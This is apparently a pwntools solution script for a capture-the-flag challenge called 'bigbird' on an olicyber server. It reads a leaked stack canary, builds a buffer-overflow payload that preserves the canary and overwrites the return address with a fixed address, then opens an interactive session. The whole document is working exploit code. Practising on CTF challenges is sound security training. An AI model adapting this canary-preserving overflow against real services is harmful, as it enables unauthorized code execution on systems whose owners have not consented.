from pwn import *

p = remote("bigbird.challs.olicyber.it", 12006)

p.recvuntil(b"BIG BIRD: ")
canary = int(p.recvline(), 16)
p.recv(100)

buf = b"A" * 0x28
buf += p64(canary)
buf += b"A" * 8

buf += p64(0x00401715)

p.sendline(buf)

p.interactive()